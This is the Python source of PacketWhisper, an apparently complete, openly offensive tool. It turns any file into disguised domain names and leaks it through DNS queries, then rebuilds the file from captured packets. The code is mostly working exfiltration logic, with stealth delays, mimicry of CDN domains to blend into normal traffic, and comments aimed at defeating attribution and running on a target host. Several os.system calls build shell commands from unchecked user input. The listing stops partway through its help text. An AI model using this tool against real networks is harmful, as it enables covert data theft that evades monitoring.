#!/usr/bin/python
#
# Filename:  packetWhisper.py
#
# Version: 1.0.0
#
# Author:  Joe Gervais (TryCatchHCF)
#
# Project Home: https://github.com/TryCatchHCF/PacketWhisper
#
# Summary:  Combines text-based steganography (via Cloakify) and DNS queries
# to exfiltrate / transfer data to any system that is able to capture a copy
# of the DNS queries along the DNS resolution path. Captured pcap can then be
# loaded into packetWhisper.py, which then extracts the encoded queries and
# restores (Decloakify) the payload.
#
# Primary use cases are defeating attribution (no direct connection to an
# attacker-controlled destination is ever required) and stealthy exfiltration
# when all other services are unavailable.
#
# Description:
#
# Leverages Cloakify (https://github.com/TryCatchHCF/Cloakify) to turn any
# file type in a list of Fully Qualified Domain Names (FQDNs), selected from
# list of ciphers by the user.
#
# packetWhisper then generates seqential DNS queries for each FQDN, which
# propagates the DNS query along the DNS resolution path.
#
# To capture the data, you just need visibility of the network traffic along
# the DNS resolution path, which can of course include a simple connected
# system capturing in promiscuous mode, or access to network appliances along
# the route, including external to the network / organization of origination.
#
# The captured pcap file is then loaded into packetWhisper, which parses
# the pcap using the matching cipher used to encode during transmission.
# The ciphered data is extracted from the pcap and then Decloakified to
# restore the file to its original form.
#
# =====  NOTE: VPNs Will Prevent Access To DNS Queries  =====
#
# If the transmitting system is using a VPN, then none of the DNS queries
# will be available unless your point of capture is upstream from the VPN
# exit node. That's obvious, but it also means if you're testing on your
# own system and running a VPN, you'll be capturing an empty PCAP file.
# Always verify your PCAP capture settings and outputs.
#
# =====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  =====
#
# If you have other datapaths available (HTTP outbound, etc.) then just use
# the Cloakify project (GitHub project URL above) and its standard ciphers,
# transfer normally.

#
# Example:
#
#   $ python packetWhisper.py
#

import os, subprocess, sys, getopt, socket, re, random, datetime, time, cloakify, decloakify

# Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)

gKnockSequenceFilename = "knockSequence.txt"
gCommonFQDNCipherSelected = False

gFilepathRandomizedSubdomainFQDN = "ciphers/subdomain_randomizer_scripts/"
gFilepathRepeatedUniqueFQDN = "ciphers/repeated_unique_fqdn/"
gFilepathCommonFQDN = "ciphers/common_fqdn/"

# Load lists of FQDN-based ciphers

gRepeatedSubdomainFQDNCipherFiles = next(os.walk( gFilepathRepeatedUniqueFQDN ))[2]
gRepeatedSubdomainFQDNCipherFiles.sort()

gCommonFQDNCipherFiles = next(os.walk( gFilepathCommonFQDN ))[2]
gCommonFQDNCipherFiles.sort()

# Kludge Alert: ("Really, TryCatchHCF? We're not even in the first function yet!"
# Yeah, I know. So, back to the kludge - various files are co-resident in the
# subdomain_randomizer_scripts/ directory, and we just read them all in. The actual
# cipher files lack a "." anywhere in their filename, so if we don't add filenames
# that contain ".", we'll have a list of only ciphers for the user to pick from.

gRandomSubdomainFQDNCipherFiles  = []
for root, dirs, files in os.walk( gFilepathRandomizedSubdomainFQDN ):
	for file in files:
		if '.' not in file:
			gRandomSubdomainFQDNCipherFiles.append( file )

gRandomSubdomainFQDNCipherFiles.sort()

# Load list of FQDN Subdomain Randomizer scripts

gSubdomainRandomizerScripts = []
for root, dirs, files in os.walk( gFilepathRandomizedSubdomainFQDN ):
	for file in files:
		if file.endswith('.py'):
			gSubdomainRandomizerScripts.append( file )

gSubdomainRandomizerScripts.sort()


#========================================================================
#
# CloakAndTransferFile()
#
# High-level coordination function for encoding and transferring the
# selected file.
#
#========================================================================

def CloakAndTransferFile():

	# Reset this each time we pass through
	global gCommonFQDNCipherSelected
	gCommonFQDNCipherSelected = False

	# Perform payload selection, cipher selection, Cloakify the payload into FQDNs
	cloakedFile = SelectCipherAndCloakifyFile()

	choice = input( "Press return to continue... " )
	print("")

	invalidSelection = True

	while ( invalidSelection ):

		choice = input( "Begin PacketWhisper transfer of cloaked file? (y/n): " )

		if choice == "y" or choice == "n":

			invalidSelection = False


	if choice == "y":

		queryDelay = 0.5

		print("")
		print("Select time delay between DNS queries:")
		print("")
		print("1) Half-Second (Recommended, slow but reliable)")
		print("2) 5 Seconds (Extremely slow but stealthy)")
		print("3) No delay (Faster but loud, risks corrupting payload)")
		print("")

		try:
			delayChoice = int( input( "Selection (default = 1): " ))

			if delayChoice == 2:
				queryDelay = 5.0

			if delayChoice == 3:
				queryDelay = 0.0

		except ValueError:

			queryDelay = 0.5


		### Send knock sequence if Common FQDN cipher used
		### Signals beginning of cloaked file in pcap (need source's IP address)

		if ( gCommonFQDNCipherSelected == True ):

			print("")
			print("Sending Knock Sequence - Begin")
			print("")
			TransferCloakedFile( gKnockSequenceFilename, queryDelay )

		TransferCloakedFile( cloakedFile, queryDelay )

		### Send knock sequence if Common FQDN cipher used
		### Signals end of cloaked file in pcap

		if ( gCommonFQDNCipherSelected == True ):

			print("")
			print("Sending Knock Sequence - End")
			print("")
			TransferCloakedFile( gKnockSequenceFilename, queryDelay )

	choice = input( "Press return to continue... " )
	print("")

	return


#========================================================================
#
# SelectCipherAndCloakifyFile()
#
# Walks user through the process of selecting payload file, which FQDN
# cipher to use, and then Cloakifies the payload into a list of FQDNs.
#
#========================================================================

def SelectCipherAndCloakifyFile():

	print("")
	print("====  Prep For DNS Transfer - Cloakify a File  ====")
	print("")

	notDone = True

	while ( notDone ):

		sourceFile = input("Enter filename to cloak (e.g. payload.zip or accounts.xls): ")

		if ( sourceFile != "" ):
			notDone = False

		else:
			print("")
			print("!!! Filename required, try again.")
			print("")

	print("")

	cloakedFile = input("Save cloaked data to filename (default: 'tempFQDNList.txt'): ")

	if cloakedFile == "":
		cloakedFile = "tempFQDNList.txt"

	print("")
	print("====  Prep For DNS Transfer - Select Cloakify cipher  ====")
	print("")

	cipherFilePath = SelectPacketWhisperMode( sourceFile, cloakedFile )

	print("")
	choice = input( "Preview a sample of cloaked file? (y/n): " )

	if choice == "y":
		print("")
		with open( cloakedFile ) as file:
			cloakedPreview = file.readlines()
			i = 0;
			while ( i < len( cloakedPreview )) and ( i<20 ):
				print(cloakedPreview[ i ],)
				i = i+1
		print("")

	return( cloakedFile )



#========================================================================
#
# CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
#
# Helper method to invoke Cloakify() to transform the payload into the
# list of FQDNs per selected FQDN cipher.
#
#========================================================================

def CloakifyPayload( sourceFile, cloakedFile, cipherFilePath ):

	print("")
	print("Creating cloaked file using cipher:", cipherFilePath)

	try:
		cloakify.Cloakify( sourceFile, cipherFilePath, cloakedFile )

	except:
		print("")
		print("!!! Well that didn't go well. Verify that your cipher is in the 'ciphers/' subdirectory.")
		print("")

	print("")
	print("Cloaked file saved to:", cloakedFile)
	print("")

	return


#========================================================================
#
# SelectPacketWhisperMode( sourceFile, cloakedFile )
#
# Walks user through the selection of the cipher to use for Cloakifying
# the payload.
#
#========================================================================

def SelectPacketWhisperMode( sourceFile, cloakedFile ):

	selectionErrorMsg = "1-4 are your options. Try again."
	cipherFilePath = ""
	notDone = 1

	while ( notDone ):

		print("")
		print("=======  Select PacketWhisper Transfer Mode  =======")
		print("")
		print("1) Random Subdomain FQDNs  (Recommended - avoids DNS caching, overcomes NAT)")
		print("2) Unique Repeating FQDNs  (DNS may cache, but overcomes NAT)")
		print("3) [DISABLED] Common Website FQDNs    (DNS caching may block, NAT interferes)")
		print("4) Help")
		print("")

		invalidSelection = 1

		while ( invalidSelection ):
			try:
				choice = int( input( "Selection: " ))

				if choice == 3:
					print("")
					print("Temporarily Disabled: Common Website FQDNs")
					print("Pardon the inconvenience it will be updated soon.")
					print("")
				elif ( choice > 0 and choice < 5 ):
					invalidSelection = 0
				else:
					print(selectionErrorMsg)

			except ValueError:
				print(selectionErrorMsg)

		if choice == 1:
			cipherFilePath = SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 2:
			cipherFilePath = SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 3:
			cipherFilePath = SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 4:
			ModeHelp()
		else:
			print(selectionErrorMsg)

	return cipherFilePath


#========================================================================
#
# ModeHelp()
#
# Because context-relevant help is always nice.
#
#========================================================================

def ModeHelp():

	print("")
	print("")
	print("==========  Help: Select PacketWhisper Transfer Mode  ==========")
	print("")
	print("==== Unique Random Subdomain FQDNs ====")
	print("")
	print("*** RECOMMENDED CIPHER MODE - FOR MOST USE CASES")
	print("")
	print("FQDNs with random subdomains help prevent DNS caching, while also able")
	print("to transfer data beyond a NAT'd network device being, since the sending")
	print("system's IP address isn't needed to identify the traffic.")
	print("")
	print("These ciphers mimic the formats of various services that rely on")
	print("complex subdomains as a means to identify a session, user, cached")
	print("content etc.")
	print("")
	print("The first part of the subdomain name is actually a string from the cipher")
	print("list. The rest of the subdomain name is randomized to make each FQDN unique,")
	print("which prevents DNS caching from shutting down the DNS query path prematurely.")
	print("We then add the domain name. We construct the FQDNs this way to look like")
	print("the usual FQDNs associated with the selected domain, to blend in better")
	print("with normal webtraffic seen on any network.")
	print("")
	print("Example:  d1z2mqljlzjs58.cloudfront.net")
	print("")
	print("")
	print("==== Unique Repeating FQDNs ====")
	print("")
	print("Created to stand out from all other DNS queries on the network, but")
	print("without any randomization involved. This means that DNS caching may")
	print("interfere, but as a side benefit you're DNS queries will be easy for")
	print("you to find in even the largest collection of multi-client pcaps.")
	print("This is due to the fact that the FQDNs are odd endpoints, like the")
	print("list of Johns (Red Lectroid aliens) at the fictional Yoyodyne Propulsion")
	print("Systems from the movie 'Buckaroo Banzai Across the 8th Dimension'.")
	print("")
	print("Example:  John.Whorfin.yoyodyne.com")
	print("")
	print("")
	print("==== Common Website FQDNs ====")
	print("")
	print("FQDNs constructed out of the most common Website URLs.")
	print("")
	print("NOTE: Since most environments are NAT'd at the perimeter (removing ")
	print("visibility of client's IP address), this mode is generally only useful")
	print("for transferring data between systems connected to the same /24 local ")
	print("network (for example, the guest wifi at your favorite coffee shop")
	print("")
	print("Since Common Website ciphers only have the source IP address as a way")
	print("to identify its queries from all the others on the network, I set ")
	print("gCommonFQDNCipherSelected to True so that the code will transmit the")
	print("knock sequence at beginning and end of payload, helps us pick out the")
	print("transmitting host from the pcap later.")
	print("")
	print("Example:  www.github.com")
	print("")
	print("")

	return


#========================================================================
#
# SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile )
#
# If user selected Random Subdomian FQDNs, Cloakify with the matching
# cipher, then invoke the matching Python script that adds the appropriate
# random noise to complete the rest of the subdomain associated with the
# domain in the selected FQDN.
#
#========================================================================

def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):

	cipherNum = SelectCipher( gRandomSubdomainFQDNCipherFiles )

	cipherFilePath = gFilepathRandomizedSubdomainFQDN + gRandomSubdomainFQDNCipherFiles[ cipherNum ]

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	### Payload is now Cloaked, time to build the rest of the FQDN
	###
	### The corresponding script is the cipher's name with ".py" suffix added to it
	###
	### This makes me feel so unclean. There is not enough soap to rinse it away
	###
	### "Mediocrity, I am your King!"
	###
	### However it's a really convenient way to correlate the cipher with its matching
	### script. And now I must accept the fact that there's a brittle connection between
	### the cipher's filename and the matching script filename.

	scriptFilename = gRandomSubdomainFQDNCipherFiles[ cipherNum ] + ".py"

	print("Adding subdomain randomization to cloaked file using :" + scriptFilename)

	try:
		os.system( "python ciphers/subdomain_randomizer_scripts/%s %s" % ( scriptFilename, cloakedFile ))

	except:
		print("")
		print("!!! Well that didn't go well. Verify that '", cloakedFile, "'")
		print("!!! is in the current working directory or try again giving full filepath.")
		print("")

	return( cipherFilePath )


#========================================================================
#
# SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
#
# After calling Cloakify with selected cipher, add a random formal title
# to thefront of each FQDN. Example "John.Smallberries.yoyodyne.com"
# becomes "Dr.John.Smallberries.yoyodyne.com"
#
# Adding a random element to this cipher category allows us to easily
# identify and ignore duplicate DNS requests that would corrupt our
# transfer. We just have to be sure that each title we append is different
# from the one that came before it.
#
#========================================================================

def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):

	titleArray = [ "Mr", "Dr", "Sir", "Prof", "Lord", "Capt", "Duke" ]

	cipherNum = SelectCipher( gRepeatedSubdomainFQDNCipherFiles )

	cipherFilePath = gFilepathRepeatedUniqueFQDN + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ]

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	# Time to add some randomization

	lastTitle = ""
	newTitle = ""

	# DEBUG
	# Print "%%%", cloakedFile

	with open( cloakedFile, "r" ) as file:

		cloakedPayload = file.read().splitlines()

	with open( cloakedFile, "w" ) as file:

		for line in cloakedPayload:

			# Only need to be sure it's not the same as the one
			# used before it, so we can identify and ignore duplicate
			# DNS requests when recovering the payload later.

			newTitle = titleArray[ random.randint(0,6) ]

			while newTitle == lastTitle:
				newTitle = titleArray[ random.randint(0,6) ]

			# Add the title to the cihper string and all is well
			file.write( newTitle + "." + line + "\n" )

			lastTitle = newTitle

	return( cipherFilePath )


#========================================================================
#
# SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
#
# Since Common Website ciphers only have the source IP address as a way
# to identify its queries from all the others on the network, I set
# gCommonFQDNCipherSelected to True so that the code will transmit the
# knock sequence at beginning and end of payload, helps us pick out the
# transmitting host from the pcap later.
#
# Note: Since most environments are NAT'd at the perimeter (removing
# client's IP information), this mode is generally only useful for
# transferring data between systems connected to the same /24 local
# subnetwork.
#
#========================================================================

def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):

	global gCommonFQDNCipherSelected

	cipherNum = SelectCipher( gCommonFQDNCipherFiles )

	cipherFilePath = gFilepathCommonFQDN + gCommonFQDNCipherFiles[ cipherNum ]

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	gCommonFQDNCipherSelected = True

	return( cipherFilePath )


#========================================================================
#
# TransferCloakedFile( cloakedFile, queryDelay )
#
# Generates sequential DNS queries for each FQDN in the Cloaked file.
#
# Adds UTC datetimestamps before and after completion, can help identify
# where in the pcap to look for info if you're capturing large volumes of
# traffic.
#
#========================================================================

def TransferCloakedFile( cloakedFile, queryDelay ):

	print("")
	print("Broadcasting file...")
	print("")
	mDateTimeUTC = datetime.datetime.utcnow()

	print("### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" ))
	print("")

	status = GenerateDNSQueries( cloakedFile,  queryDelay )

	mDateTimeUTC = datetime.datetime.utcnow()

	print("")
	print("### Ending Time (UTC): " + mDateTimeUTC.strftime( "%x %X" ))
	print("")

	return



#========================================================================
#
# GenerateDNSQueries( cloakedFile, queryDelay )
#
# Leverages nslookup on host OS. Seems lazy, and is, but also lets us
# leverage nslookup's implementation which has consistent behavior across
# operating systems (timeouts, avoiding unwanted retries, caching, etc.)
#
# "But why not just use 'dnspython'?" Because it's one more thing to have
# to import, brings a lot of baggage with it, and that's not how I like
# my operational tools to be structured. The way PacketWhisper is
# structured, I can get it running on a limited shell host just by
# tar'ing up the project and extracting on the target host.
#
# Adds a half-second delay between DNS queries to help address UDP out-of-order
# delivery race conditions, etc.
#
#========================================================================

def GenerateDNSQueries( cloakedFile, queryDelay ):

	tmpAddrStr = ""
	byteCount = 0

	with open( cloakedFile, 'r' ) as fqdnFile:

		print("Progress (bytes transmitted - patience is a virtue): ")

		for fqdn in fqdnFile:

			fqdnStr = fqdn.strip()

			# We don't care if the lookup fails, so carry on
			try:
				ret = subprocess.check_output( ['nslookup', fqdnStr] )
				time.sleep( queryDelay )
			except:
				time.sleep( queryDelay )

			checkpoint = byteCount % 25

			if byteCount > 0 and checkpoint == 0:

				print(str( byteCount ) + "...")

			byteCount = byteCount + 1

	return


#========================================================================
#
# ExtractDNSQueriesFromPCAP( pcapFile, osStr )
#
# Creates a textfile with all of the DNS queries (UDP Port 53). Makes a
# system call to either tcpdump or windump, depending on the OS selected
# by the user.
#
#========================================================================

def ExtractDNSQueriesFromPCAP( pcapFile, osStr ):

	dnsQueriesFilename = "dnsQueries.txt"

	if ( osStr == "Linux" ):

		commandStr = "tcpdump -r " + pcapFile + " udp port 53 > " + dnsQueriesFilename

		os.system( commandStr )

	elif ( osStr == "Windows" ):

		commandStr = "windump -r " + pcapFile + " udp port 53 > " + dnsQueriesFilename

		os.system( commandStr )

	else:
		print("!!! Error: Unknown OS received by ExtractDNSQueriesFromPCAP(), this shouldn't have happened. Oops.")


	return dnsQueriesFilename



#========================================================================
#
# ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized )
#
# The fun stuff. Identify the PacketWhisper FQDN ciphers in the
# collection of DNS queries, and reconstruct the Cloakified payload file
# with the matches.
#
# cipherTag is the unique element association with some ciphers. For
# Random Subdomain FQDN ciphers it's the domain name. For Common FQDNs
# it's the source IP address associated with the knock sequence. It
# provides additional context when extracting cipher strings from a
# pcap file, which reduces the risk of false matches corrupting results.
#
#========================================================================

def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized ):

	cloakedFilename = "cloaked.payload"

	try:
		with open( dnsQueriesFilename ) as queriesFile:
    			queries = queriesFile.readlines()
	except:
		print("")
		print("!!! Oh noes! Problem reading DNS queries from '", dnsQueriesFilename, "'")
		print("!!! Verify the location of the file")
		print("")
		return

	try:
		with open( cipherFilename ) as cipherFile:
    			cipherStrings = cipherFile.readlines()
	except:
		print("")
		print("!!! Oh noes! Problem reading '", cipherFilename, "'")
		print("!!! Verify the location of the cipher file")
		print("")
		return

	try:
		cloakedFile = open( cloakedFilename, "w" )
	except:
		print("")
		print("!!! Oh noes! Problem reading '", cloakedFile, "'")
		print("!!! Verify the location of the cipher file")
		print("")
		return


	# Activate "Elegance Mode" here - We don't have to extract the cipher
	# string from the DNS query. Instead, we only need to know that a
	# cipher string *appears* in the query. Then we can simply add the
	# corresponding cipher string to the cloaked payload file, because
	# inference. \o/

	previousSubdomain = ""

	for dnsQuery in queries:

		for cipherElement in cipherStrings:

			# We're matching on any "A?" DNS queries that also contain the cipher element

			foundQuery1 = re.search(r"A\? " + cipherElement + "?", dnsQuery)

			# For Repeated cipher family, we add a tag as the first element of the FQDN
			# to identify duplicate requests. This search catches those.

			if not foundQuery1:

				foundQuery2 = re.search(r"A\?\s*.+\." + cipherElement + "?", dnsQuery)

			if foundQuery1 or foundQuery2:

				# Now match those hits to DNS queries that also contain the cipher
				# tag. This may seem redundant to the re.search() above, but since
				# the cipher tag may appear before or after that "A?" element, we
				# use a different regex base string ("IP ") that will always appear
				# before the possible positions of the cipher tag

				found = re.search(r"IP " + cipherTag + "?", dnsQuery)

				if found:

					# Confirmed match, minimized the risk of "bad luck" false
					# positives. Add the cipher element to the extracted cloaked
					# file that we'll later pass to Decloakify()

					queryElements = dnsQuery.split()
					fqdnElements = queryElements[ 7 ].split( '.' )
					subdomain = fqdnElements[ 0 ]

					# Don't write out duplicate subdomains if cipher was
					# randomized, since that means it's a duplicate DNS query
					if isRandomized and subdomain != previousSubdomain:

						cloakedFile.write( cipherElement )

					elif not isRandomized:

						cloakedFile.write( cipherElement )

					previousSubdomain = subdomain

	queriesFile.close()
	cipherFile.close()
	cloakedFile.close()

	return cloakedFilename


#========================================================================
#
# ExtractCapturedPayload()
#
# High level function that coordinates selecting the FQDN cipher that was
# used, loading the PCAP file, extracting the Cloakified payload from the
# PCAP, and the Decloakifying the payload to restore the exfiltrated file.
#
#========================================================================

def ExtractCapturedPayload():

	# Kludge Alert: Yeah, I'm not proud of these brittle hardcoded
	# strings, but it's an easy way to identify which cipher tag
	# we'll need to use to help avoid false matches when extracting
	# our payloads

	cloudfrontStr = "cloudfront.net"
	akstatStr = "akstat.io"
	optimizelyStr = "optimizely.com"
	commonFQDNStr = "www"

	pcapTextFilename = "tempPcapFile.txt"

	osStr = ""

	print("")
	print("====  Extract & Decloakify a Cloaked File  ====")
	print("")
	print("IMPORTANT: Be sure the file is actually in PCAP format.")
	print("If you used Wireshark to capture the packets, there's")
	print("a chance it was saved in 'PCAP-like' format, which won't")
	print("here. If you have problems, be sure that tcpdump/WinDump")
	print("can read it manually:   tcpdump -r myfile.pcap")
	print("")
	pcapFile = input( "Enter PCAP filename: " )
	print("")
	print("What OS are you currently running on?")
	print("")
	print("1) Linux/Unix/MacOS")
	print("2) Windows")
	print("")
	osHost = input( "Select OS [1 or 2]: " )

	if osHost == "2":
		osStr = "Windows"
	else:
		osStr = "Linux"

	dnsQueriesFilename = ExtractDNSQueriesFromPCAP( pcapFile, osStr );

	cipherFilePath = SelectCipherForExtraction()

	print("Extracting payload from PCAP using cipher:", cipherFilePath)
	print("")

	# cipherTag is extra identifying information associated with an FQDN cipher.
	# Necessary in cases where there is a risk of duplicate substrings in the
	# pcap file that aren't actually part of a PacketWhisper cipher, usually
	# due to bad luck or using the Common Domains cipher.

	cipherTag = ""

	# isRandomized lets us track if the cipher is randomized and therefore
	# for all practical purposes there will never be adjacent duplicate
	# FQDNs in the PCAP file. This is a really simple way of identifying and
	# skipping duplicate DNS queries

	isRandomized = True

	# For Random Subdomain FQDN ciphers, use the base domain name as extra filter
	# For Common FQDN ciphers, use the IP address that sent the knock sequence

	if ( akstatStr in cipherFilePath ):
		cipherTag = akstatStr;

	elif ( cloudfrontStr in cipherFilePath ):
		cipherTag = cloudfrontStr;

	elif ( optimizelyStr in cipherFilePath ):
		cipherTag = optimizelyStr;

	elif ( commonFQDNStr in cipherFilePath ):
		cipherTag = commonFQDNStr
		isRandomized = False


	# If it's a Common FQDN cipher, we have to use the embedded knock sequence
	# to determine the correct source IP address amidst a possible sea of
	# duplicate requests. New cipherTag will be the source IP address of the
	# knock sequence in pcap.

	if ( cipherTag == commonFQDNStr ):

		# DEBUG
		print() ### Common cipher branch

		cipherTag = GetSourceIPViaKnockSequence( dnsQueriesFilename )

		if ( cipherTag == "" ):
			print("")
			print("!!! Error: Common FQDN cipher selected, but knock sequence not found")
			print("!!!        in PCAP file. Unable to determine which DNS queries are")
			print("!!!        from the PacketWhisper client.")
			print("")

			return

	cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilePath, cipherTag, isRandomized )

	# Decloakify file

	DecloakifyFile( cloakedFile, cipherFilePath )

	return




#========================================================================
#
# SelectCipherForExtraction()
#
# This is a bit redundant to the function that selects FQDN cipher for
# Cloakifying and transmitting the payload, but for now those two workflows
# do not share code. Will refactor for cleaner design in the next update.
#
# In the meantime, having two different flows allows me to tailor the
# menu for better user context.
#
#========================================================================

def SelectCipherForExtraction():

	selectionErrorMsg = "1-3 are your options. Try again."
	cipherFilePath = ""
	notDone = 1

	while ( notDone ):

		print("")
		print("=======  Select PacketWhisper Cipher Used For Transfer  =======")
		print("")
		print("1) Random Subdomain FQDNs  (example: d1z2mqljlzjs58.cloudfront.net)")
		print("2) Unique Repeating FQDNs  (example: John.Whorfin.yoyodyne.com)")
		print("3) [DISABLED] Common Website FQDNs    (example: www.youtube.com)")
		print("")

		invalidSelection = 1

		while ( invalidSelection ):
			try:
				choice = int( input( "Selection: " ))

				if choice == 3:
					print("")
					print("Temporarily Disabled: Common Website FQDNs")
					print("Pardon the inconvenience it will be updated soon.")
					print("")
				elif ( choice > 0 and choice < 4 ):
					invalidSelection = 0
				else:
					print(selectionErrorMsg)

			except ValueError:
				print(selectionErrorMsg)

		if choice == 1:
			cipherNum = SelectCipher( gRandomSubdomainFQDNCipherFiles )
			cipherFilePath = gFilepathRandomizedSubdomainFQDN + gRandomSubdomainFQDNCipherFiles[ cipherNum ]
			notDone = 0
		elif choice == 2:
			cipherNum = SelectCipher( gRepeatedSubdomainFQDNCipherFiles )
			cipherFilePath = gFilepathRepeatedUniqueFQDN + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ]
			notDone = 0
		elif choice == 3:
			cipherNum = SelectCipher( gCommonFQDNCipherFiles )
			cipherFilePath = gFilepathCommonFQDN + gCommonFQDNCipherFiles[ cipherNum ]
			notDone = 0
		elif choice == 4:
			ModeHelp()
		else:
			print(selectionErrorMsg)

	return cipherFilePath



#========================================================================
#
# GetSourceIPViaKnockSequence( dnsQueriesFile )
#
# Extracts the source IP address of the system that queried for the
# knock sequence. We then use that value as the cipher tag while
# extracting Common FQDN ciphers from the PCAP file, since otherwise
# we'd have no idea how to tell the difference between all those other
# systems querying for common FQDNs.
#
#========================================================================

def GetSourceIPViaKnockSequence( dnsQueriesFilename ):

	# WARNING: This is a duplicate hardcoded value of the string found
	# in the file 'knockSequence.txt'. This is unclean. It will be fixed.

	knockSequenceStr = "camembert.google.com"

	sourceIPAddrStr = ""

	try:
		with open( dnsQueriesFilename ) as queriesFile:
    			queries = queriesFile.readlines()

		queriesFile.close()

	except:
		print("")
		print("!!! Oh noes! Problem reading '", dnsQueriesFile, "'")
		print("!!! Verify the location of the DNS queries file")
		print("")
		return

	for dnsQuery in queries:

		found = re.search(r"A\? " + knockSequenceStr + "?", dnsQuery)

			# Found the knock sequence in the DNS queries
			# Extract and return the source IP address

		if found:

			queryFields = dnsQuery.split()
			ipAddr = queryFields[ 2 ].split( '.' )
			sourceIPAddrStr = ipAddr[ 0 ] + "." + ipAddr[ 1 ] + "." + ipAddr[ 2 ] + "." + ipAddr[ 3 ]

			# DEBUG
			print(dnsQuery)
			print(sourceIPAddrStr)

			# Generally not a fan of returns within loops, but here we are...
			return sourceIPAddrStr

	return sourceIPAddrStr



#========================================================================
#
# DecloakifyFile( cloakedFile, cipherFilePath )
#
# Straightforward call to Decloakify to restore the payload to its
# original form.
#
#========================================================================

def DecloakifyFile( cloakedFile, cipherFilePath ):

	decloakedFile = input( "Save decloaked data to filename (default: 'decloaked.file'): " )

	if decloakedFile == "":
		decloakedFile = "decloaked.file"

	try:
		decloakify.Decloakify( cloakedFile, cipherFilePath, decloakedFile )

		print("")
		print("File '" + cloakedFile + "' decloaked and saved to '" + decloakedFile + "'")
		print("")
	except:
		print("")
		print("!!! Oh noes! Error decloaking file (did you select the same cipher it was cloaked with?)")
		print("")

	choice = input("Press return to continue... ")

	return


#========================================================================
#
# TestDNSAccess()
#
# "Lame function of lameness!" you declare. You're not wrong, but sometimes
# it's nice to check things from within the user interface. Also, since it's
# part of the UI, it reminds the user that, yes, there's a chance DNS
# queries won't get far (network is down, etc.).
#
#========================================================================

def TestDNSAccess():

	defaultFQDNStr = "www.google.com"
	addr = ""

	print("")
	testFQDNStr = input("Enter domain name / FQDN to query for (default=www.google.com): ")
	print("")

	if testFQDNStr == "":
		testFQDNStr = defaultFQDNStr

	try:
		commandStr = "nslookup " + testFQDNStr

		os.system( commandStr )

	except:
		print("!!! Warning: Error while calling 'nslookup'")
		print("")
		print("!!! PacketWhisper transfer will likely fail.")
		print("")

	choice = input("Press return to continue... ")


#========================================================================
#
# SelectCipher( cipherFiles )
#
# Helper method to prompt the user to select from a list of available
# ciphers.
#
#========================================================================

def SelectCipher( cipherFiles ):
	print("")
	print("Ciphers:")
	print("")

	cipherCount = 1

	for cipherName in cipherFiles:
		print(cipherCount, "-", cipherName)
		cipherCount = cipherCount + 1
	print("")

	selection = -1

	while ( selection < 0 or selection > (cipherCount - 2)):
		try:
			cipherNum = input( "Enter cipher #: " )

			selection = int ( cipherNum ) - 1

			if ( cipherNum == "" or selection < 0 or selection > (cipherCount - 1)):
				print("Invalid cipher number, try again...")
				selection = -1

		except ValueError:
			print("Invalid cipher number, try again...")
	print("")
	return selection



#========================================================================
#
# Help()
#
# Mostly a rehash of the other documentation, but always nice to have it
# handy within the tool while you're running it.
#
#========================================================================

def Help():

	PrintBanner()

	print("")
	print("")
	print("=====================  Using PacketWhisper  =====================")
	print("")
	print("Project Home: https://github.com/TryCatchHCF/PacketWhisper")
	print("")
	print("Summary:  Combines text-based steganography (via Cloakify) and DNS queries")
	print("to exfiltrate / transfer data to any system that is able to capture a copy")
	print("of the DNS queries along the DNS resolution path. Captured pcap can then be")
	print("loaded into packetWhisper.py, which then extracts the encoded queries and")
	print("restores (Decloakify) the payload.")
	print("")
	print("Primary use cases are defeating attribution (no direct connection to an")
	print("attacker-controlled destination is ever required) and stealthy exfiltration")
	print("when all other services are unavailable.")
	print("")
	print("Be sure to read the slide presentation (PDF) included with the project.")
	print("It will give you a good overview of the key concepts, as well as use")
	print("cases, and issues / defender mitigations that may get in your way.")
	print("")
	print("As a quick test, run PacketWhisper from a VM, then send a file while doing")
	print("a packet capture on the VM's network interface via the host system. You can")
	print("then load the PCAP file into whichever PacketWhisper instance is convenient")
	print("to decode the file. Just remember it's not a speedy transfer. Smaller files")
	print("and patience are your friend.")
	print("")
	print("Description:")
	print("")
	print("Leverages Cloakify (https://github.com/TryCatchHCF/Cloakify) to turn any")
	print("file type in a list of Fully Qualified Domain Names (FQDNs), selected from")
	print("list of ciphers by the user.")
	print("")
	print("PacketWhisper then generates seqential DNS queries for each FQDN, which")
	print("propagates the DNS query along the DNS resolution path.")
	print("")
	print("To capture the data, you just need visibility of the network traffic along")
	print("the DNS resolution path, which can be as simple as a connected system")
	print("capturing in promiscuous mode (wifi), IoT devices, or access to network")
	print("appliances along the DNS query path, including external to the organization")
	print("of origination.")
	print("")
	print("The captured pcap file is then loaded into PacketWhisper on whatever system")
	print("is convenient. It then parses the pcap file using the matching cipher used")
	print("to encode during transmission. The ciphered data is extracted from the pcap")
	print("and then Decloakified to restore the file to its original form.")
	print("")
	print("=====  NOTE: VPNs Will Prevent Access To DNS Queries  =====")
	print(" ")
	print(" If the transmitting system is using a VPN, then none of the DNS queries")
	print(" will be available unless your point of capture is upstream from the VPN")
	print(" exit node. That's obvious, but it also means if you're testing on your")
	print(" own system and running a VPN, you'll be capturing an empty PCAP file.")
